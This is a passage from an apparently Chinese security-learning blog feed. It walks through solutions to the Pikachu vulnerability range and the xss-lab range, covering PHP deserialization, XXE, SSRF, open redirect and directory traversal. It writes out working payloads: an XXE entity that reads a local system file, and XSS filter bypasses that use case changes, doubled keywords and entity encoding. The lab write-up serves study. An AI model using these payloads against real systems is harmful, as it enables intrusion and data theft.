src="https://i.loli.net/2021/02/14/OCyG3DBHNIjdvWu.png"></p><p>将普通用户的cookie粘贴到添加用户抓的包里，</p><p><img src="https://i.loli.net/2021/02/14/VrMXx7dmsIcv3aJ.png"></p><p>可以看到hhhhhh添加进去了</p><p><img src="https://i.loli.net/2021/02/14/tHUlRbL5qvKgoCN.png"></p><p><img src="https://i.loli.net/2021/02/14/Xz784sFgK3Polfn.png"></p><h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><blockquote><p>概述：在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p><p>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。</p><p>需要区分一下的是,如果你通过不带参数的url（比如：<a href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。</a> 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在”i can see you ABC”中了解更多）</p></blockquote><p><img src="https://i.loli.net/2021/02/14/8b5eYIXdHhmA1LR.png"></p><p>修改路径即可</p><h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><blockquote><p>概要：由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p><p>类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。</p><p>你可以通过“i can see your abc”对应的测试栏目，来进一步的了解该漏洞。</p></blockquote><p>查看网页源代码：</p><p><img src="https://i.loli.net/2021/02/14/t4gX9LirypKnR6O.png"></p><p>登陆后进入abc.php；也可以直接在url输入abc.php进入此界面</p><p><img src="https://i.loli.net/2021/02/14/IH5roqGO6zaDbs4.png"></p><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>先了解两个函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serialize()：将一个对象转换成一个字符串</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize()：将字符串还原为一个对象</span><br></pre></td></tr></table></figure><p>序列化：将变量或对象转换为可保存或传输的字符串的过程；在php中使用<code>serialize()</code>实现 将类进行序列化的过程</p><p>反序列化：将字符串转换成变量或对象的过程；在php中使用<code>unserialize()</code>实现</p><blockquote><p>官方文档：所有php里面的值都可以使用函数<a href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a>来返回一个包含字节流的字符串来表示。<a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p><p>为了能够<a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个定义该类的文件或使用函数<a href="https://www.php.net/manual/zh/function.spl-autoload-register.php">spl_autoload_register()</a>来实现。</p></blockquote><p>eg:先设置一个类 test，在类test中定义两个属性name和money；创建对象a，并将其序列化；输出序列化结果。</p><p><img src="https://i.loli.net/2021/02/14/vT2wkJGmtdHYpDU.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;money&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;verymuch&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>o：对象object；4：为test长度；2：为{}内属性个数；</p><p>{}内为对象的属性；s：表示类型为字符串string；4：表示属性名长度；”name”为属性名；随后s、2一样；”ls”为属性name的值；</p><p>即：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obeject：对象名长度：<span class="string">&quot;对象名&quot;</span>：属性个数&#123;属性类型：属性名长度：<span class="string">&quot;属性名&quot;</span>；属性值类型：属性值长度：<span class="string">&quot;属性值&quot;</span>.....&#125;</span><br></pre></td></tr></table></figure><p>反序列化漏洞与魔法函数有大关联~~</p><blockquote><p><code>__construct</code>当一个对象创建时调用（constructor）；<br><code>__destruct</code>当一个对象被销毁时调用（destructor）；<br><code>__toString</code>当一个对象被当作一个字符串时使用；<br><code>__sleep</code>当对一个对象在被序列化之前运行（如果存在的话）；<br><code>__wakeup</code>在反序列化时，php就会调用<code>__wakeup</code>方法（如果存在的话）；</p></blockquote><table><thead><tr><th>魔法函数：</th><th align="center">说明</th></tr></thead><tbody><tr><td>__construct()</td><td align="center">类的构造函数</td></tr><tr><td>__destruct()</td><td align="center">类的析构函数</td></tr><tr><td>__call()</td><td align="center">在对象中调用一个不可访问方法时调用</td></tr><tr><td>__callStatic()</td><td align="center">用静态方式中调用一个不可访问方法时调用</td></tr><tr><td>__get()</td><td align="center">获得一个类的成员变量时调用</td></tr><tr><td>__set()</td><td align="center">设置一个类的成员变量时调用</td></tr><tr><td>__isset()</td><td align="center">当对不可访问属性调用isset()或empty()时调用</td></tr><tr><td>__unset()</td><td align="center">当对不可访问属性调用unset()时被调用</td></tr><tr><td>__sleep()</td><td align="center">执行serialize()时，先会调用这个函数</td></tr><tr><td>__wakeup()</td><td align="center">执行unserialize()时，先会调用这个函数</td></tr><tr><td>__toString()</td><td align="center">类被当成字符串时的回应方法</td></tr><tr><td>__invoke()</td><td align="center">调用函数的方式调用一个对象时的回应方法</td></tr><tr><td>__set_state()</td><td align="center">调用var_export()导出类时，此静态方法会被调用</td></tr><tr><td>__clone</td><td align="center">当对象复制完成时调用</td></tr><tr><td>__autoload()</td><td align="center">尝试加载未定义的类</td></tr><tr><td>__debugInfo()</td><td align="center">打印所需调试信息</td></tr></tbody></table><p>接受序列化数据，并将其反序列化</p><p><img src="https://i.loli.net/2021/02/14/vhR5pwWGieZ4ack.png"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="comment">#此处魔法函数被重新，设定直接输出test内容</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];<span class="comment">#以post的方式传参给$o</span></span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = unserialize(<span class="variable">$s</span>))&#123;<span class="comment">#赋值给$unser；@无回显；</span></span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;<span class="comment">#赋值成功则将其反序列化并作为p标签返回</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处会输出$s反序列化后的值(无waf)，则提交一个序列化参数=》反序列化=》序列化前的值</p><p>由此构造payload(xss)：</p><p><img src="https://i.loli.net/2021/02/14/xDzmHyfnXh1McJu.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">27</span>:<span class="string">&quot;&lt;script&gt;alert(111)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>放进去就行啦</p><p><img src="https://i.loli.net/2021/02/14/ZChqMt43TzxGs5y.png"></p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><blockquote><p>XXE -“xml external entity injection”即”xml外部实体注入漏洞”。</p><p>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题，<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p><p>由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的</p></blockquote><p>基本的payload结构：</p><p><img src="https://i.loli.net/2021/02/14/oPEhW9IDKQUZxJ6.jpg"></p><p>eg：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;abc&gt;&amp;d;&lt;&#x2F;abc&gt;</span><br></pre></td></tr></table></figure><blockquote><p><strong>xml文档声明结构</strong></p><p>eg：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>l  version属性：用于说明当前xml文档的版本，因为都是在用1.0，所以这个属性值大家都写1.0，version属性是必须的；</strong></p><p><strong>l  encoding属性：用于说明当前xml文档使用的字符编码集，xml解析器会使用这个编码来解析xml文档。encoding属性是可选的，默认为UTF-8。注意，如果当前xml文档使用的字符编码集是gb2312，而encoding属性的值为UTF-8，那么一定会出错的；</strong></p><p><strong>l  standalone属性：用于说明当前xml文档是否为独立文档，如果该属性值为yes，表示当前xml文档是独立的，如果为no表示当前xml文档不是独立的，即依赖外部的约束文件。默认是yes</strong></p><p><strong>l  没有xml文档声明的xml文档，不是格式良好的xml文档；</strong></p><p><strong>l  xml文档声明必须从xml文档的1行1列开始。</strong></p></blockquote><blockquote><p><strong>DTD实体:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">一般实体的声明：&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">引用方法：&amp;实体名称;</span><br><span class="line">p.s.可在DTD、XML、声明前以及实体声明内部引用。</span><br><span class="line">参数实体的声明：&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">引用方法：%实体名称;</span><br><span class="line">ps:只能在DTDT中引用，不可在声明前以及实体声明内部引用</span><br><span class="line"></span><br><span class="line">记住“&amp;”符号要进行编码</span><br></pre></td></tr></table></figure><p><strong>DTD实体声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">内部实体声明：&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">当引用一般实体时，由三部分构成：&amp;、实体名、；，当是用参数传入xml的时候，&amp;需URL编码，不然&amp;会被认为是参数间的连接符号。</span><br><span class="line"></span><br><span class="line">外部实体声明：&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure></blockquote><p>使用此payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;abc&gt;&amp;d;&lt;&#x2F;abc&gt;</span><br></pre></td></tr></table></figure><p>=&gt;<img src="https://i.loli.net/2021/02/14/mLMThdj2pk6BN4R.png"></p><p>或者：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY d &quot;here has a xxe~~~&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;abc&gt;&amp;d;&lt;&#x2F;abc&gt;</span><br></pre></td></tr></table></figure><p>=&gt;<img src="https://i.loli.net/2021/02/14/Tprh6UwFzlSQMB1.png"></p><h1 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h1><blockquote><p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。<br>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话<br>就可能发生”跳错对象”的问题。</p><p>url跳转比较直接的危害是:<br>–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p></blockquote><p>检查元素，可以看到跳转的参数为url=xxx</p><p><img src="https://i.loli.net/2021/02/14/8bvJB1CIqr9O4fz.png"></p><p>修改为想跳转的链接即可：如url=<a href="https://www.baidu.com/">https://www.baidu.com/</a></p><p><img src="https://i.loli.net/2021/02/14/JLBbnfIF1KCt32Z.png"></p><p>点击就会跳转到百度页面啦~</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><blockquote><p>由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制</p><p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p><p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p><p>根据后台使用的函数的不同,对应的影响和利用方法又有不一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()     </span><br></pre></td></tr></table></figure><p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,<strong>则请做好目标地址的过滤</strong>。</p></blockquote><h2 id="SSRF-CURL"><a href="#SSRF-CURL" class="headerlink" title="SSRF(CURL)"></a>SSRF(CURL)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl:</span><br><span class="line">PHP 支持 Daniel Stenberg 创建的 libcurl 库，能够连接通讯各种服务器、使用各种协议。libcurl 目前支持的协议有 http、https、ftp、gopher、telnet、dict、file、ldap。 libcurl 同时支持 HTTPS 证书、HTTP POST、HTTP PUT、 FTP 上传(也能通过 PHP 的 FTP 扩展完成)、HTTP 基于表单的上传、代理、cookies、用户名+密码的认证。</span><br><span class="line"></span><br><span class="line">语法:</span><br><span class="line">curl_init()：初始化 cURL 会话。</span><br><span class="line">curl_setopt()：设置 cURL 传输选项。</span><br><span class="line">curl_exec()：返回 true &#x2F; false，curl_setopt 设置CURLOPT_RETURNTRANSFER 为 TRUE 时将 curl_exec() 获取的信息以字符串返回。</span><br><span class="line">curl_close()：关闭 cURL 会话。</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/tjmCixeIg8L75bo.png"></p><p>原本引用路径的文件内容(编码原因显示乱码)</p><p><img src="https://i.loli.net/2021/02/14/JPdANaUfOqmWsyT.png"></p><p>将参数url更改为我们要引用的路径即可</p><p><img src="https://i.loli.net/2021/02/14/8RhVbar26LuJtFZ.png"></p><h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file_get_content():将指定 URL 的文件读入一个字符串并返回。</span><br><span class="line">file_get_contents(path, include_path, context, start, max_length)</span><br><span class="line">path：要读取的路径或链接。</span><br><span class="line">include_path：是否在路径中搜索文件，搜索则设为 1，默认为 false。</span><br><span class="line">context：修改流的行为，如超时时间，GET &#x2F; POST 等。</span><br><span class="line">start：开始读文件的位置。</span><br><span class="line">max_length：读取文件的字节数。</span><br></pre></td></tr></table></figure><p>同上，只是后端使用的函数不同。</p><p><img src="https://i.loli.net/2021/02/14/NO82jecGxVC5A4K.png"></p><p><img src="https://i.loli.net/2021/02/14/weaQTJhVq6RgpGr.png"></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>做了两天到后面其实有些力不从心==，不过总算做完了hh~</p><p>按照做的情况来看大部分漏洞还算熟悉，</p><p>接触较少的有越权、php反序列化、SSRF</p><p>理解较少的有XXE</p><p>继续努力！</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-lab通关小记</title>
      <link href="2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/"/>
      <url>2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>实际构造闭合，另外要对js有一定了解</p><p>常用测试语句：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;svg onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;a href=javascript:alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h2><p>url为：<a href="http://xssaq.com/yx/level1.php?name=test">http://xssaq.com/yx/level1.php?name=test</a><br>GET型，源码显示<br>在传参处插入代码即可：?name=<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><p>Url为:<a href="http://xssaq.com/yx/level2.php?keyword=test">http://xssaq.com/yx/level2.php?keyword=test</a><br>GET型,输入<code>&lt;script&gt;alert(/hack11/)&lt;/script&gt;</code>：<br><img src="https://i.loli.net/2021/02/13/DBNOTv9yuzCqMQm.png"></p><p>构造闭合，即<code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;//</code><br>“和&gt;将其之前的语句闭合为value=&lt;””&gt;,//或者&lt;”将后方”&gt;注释<br><img src="https://i.loli.net/2021/02/13/GHM4a78wmlZrt1f.png"></p><h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><p>Value同2，value=””&gt;<br><code>&lt;script&gt;alert(/hack11/)&lt;/script&gt;</code>,查看响应，后端将&lt;&gt;过滤了<br><img src="https://i.loli.net/2021/02/13/IBsk2vCh5fR4oFD.png"></p><p>查看源码，使用了htmlspecialchars函数<br><img src="https://i.loli.net/2021/02/13/n5wQOlJ4BMG6Xms.png"><br><img src="https://i.loli.net/2021/02/13/FSEZ6xjpqacyXD1.png"></p><p>可以使用不带有尖括号的特殊字符进行尝试<br>如：<code>&#39; onclick=&#39;alert(1)</code><br>（利用了HTML DOM 的onclick事件，点击后触发包含的命令）    </p><ul><li>第一个单引号的作用：闭合<code>value=&#39;</code></li><li>第二个单引号的作用：与valuer=’’的第二个引号对应，构成<code>onclick=&#39;alert(1)&#39;</code><br><img src="https://i.loli.net/2021/02/13/ifQhPs5CEXYJcbD.png"></li></ul><h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p>输入：<code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;//</code>        ，<code>&lt;&gt;</code>被过滤<br><img src="https://i.loli.net/2021/02/13/5XnuHTlBzUYPGSi.png"></p><p>类似level3，不同的是单引号换为双引号构造闭合：<br><code>&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/hVZxg39tKsEAfpG.png"></p><h2 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h2><ul><li><p>尝试 <code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;&lt;&quot;</code>，发现script被过滤<br><img src="https://i.loli.net/2021/02/13/fwqic3VlrZvYRz2.png"></p></li><li><p>尝试<code>&quot; onclick=&quot;alert(1)</code>，发现on被过滤<br><img src="https://i.loli.net/2021/02/13/lLNBKGCsAtcQom8.png"></p></li><li><p>最终poc：<code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;&lt;&quot;</code><br><img src="https://i.loli.net/2021/02/13/2QKFvDzJmacTxYS.png"><br>点击即可触发<br><img src="https://i.loli.net/2021/02/13/YLMlUZ6IVq3mwtj.png"></p></li></ul><h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><ul><li><p>构造 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>    ，<code>script</code>被过滤<br><img src="https://i.loli.net/2021/02/13/mkcMn8bqDWVdLpg.png"></p></li><li><p>构造 <code>&lt;img src=x onerror=alert(1)&gt;</code>  ,<code>src</code>,<code>on</code>被过滤<br><img src="https://i.loli.net/2021/02/13/h4gtFHRDqI5KBpf.png"></p></li><li><p>构造 <code>&lt;a href=javascript:alert(1)&gt;</code>     ，<code>href</code>被过滤<br><img src="https://i.loli.net/2021/02/13/yCrAILKH3dzEfgl.png"></p></li></ul><ul><li>最终poc1：<br><code>&quot;&gt;&lt;a Href=javascript:alert(1)&gt;&lt;&quot;</code> 进行大小写绕过<br><img src="https://i.loli.net/2021/02/13/PDRVBjso12MxYXH.png"><br><img src="https://i.loli.net/2021/02/13/ZJ73fWwcuYhzxFe.png"></li></ul><ul><li>最终poc2：<br><code>&quot; ONclick=&quot;alert(1)</code>，其他亦同<br><img src="https://i.loli.net/2021/02/13/ejVWHLoqZrpixaf.png"></li></ul><ul><li>源码：过滤部分关键字，没有对大小写进行针对<br><img src="https://i.loli.net/2021/02/13/Lo31XaGHvIMRitw.png"></li></ul><h2 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h2><ul><li>老四样测试，script、src、on、href皆被置换为空</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt; </span><br><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;svg onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;a href=javascript:alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/8CW54NmTldBEvLa.png"><br><img src="https://i.loli.net/2021/02/13/zZEaPMpcVQT5LCt.png"><br><img src="https://i.loli.net/2021/02/13/RfE3meS25jqy4oz.png"><br><img src="https://i.loli.net/2021/02/13/qMYmV7ZT8KC1t2J.png"></p><ul><li>尝试大小写绕过，会将输入全部转换为小写，在匹配关键词置换为空</li><li>poc(双写绕过)：<br><code>&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert(1)&gt;&lt;&quot;</code><br><img src="https://i.loli.net/2021/02/13/wq1KlSz2TGdJ6DR.png"><br><img src="https://i.loli.net/2021/02/13/4rtTgZfAanjWYc7.png"></li></ul><ul><li>源码：过滤部分关键字：strtolower把所有字符转换为小写再进行过滤</li></ul><p><img src="https://i.loli.net/2021/02/13/tMjuFApHsYIP7xc.png"></p><h2 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h2><ul><li><p>‘添加友情链接’，应为DOM型xss<br><code>&lt;a href=javascript:alert(1)&gt;</code>：<br>href，javascript都被过滤，大小写和双写绕过都失效<br><img src="https://i.loli.net/2021/02/13/okHQ72fMaguFmEr.png"></p></li><li><p>尝试编码绕过<br><code>javascript:alert(1)</code><br><img src="https://i.loli.net/2021/02/13/4NfeLIc6BguKdrZ.png"></p></li><li><p>Burpsuite编码</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/jyH9wteMQIm2xhD.png"></p><h2 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h2><ul><li>DOM型，基于Level8多了一个判定，查看源码，需在构造语句后加上<code>http://</code><br>即：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;<span class="comment">//http://</span></span><br></pre></td></tr></table></figure><ul><li>源码：<br>同8，先将关键字替换，再判断变量后是否有<code>http://</code><br>Strpos($str,’http://’)：查找http://在字符串中第一次出现的位置<br><img src="https://i.loli.net/2021/02/13/WqVb1EzPLfopyCx.png"></li></ul><h2 id="Level10"><a href="#Level10" class="headerlink" 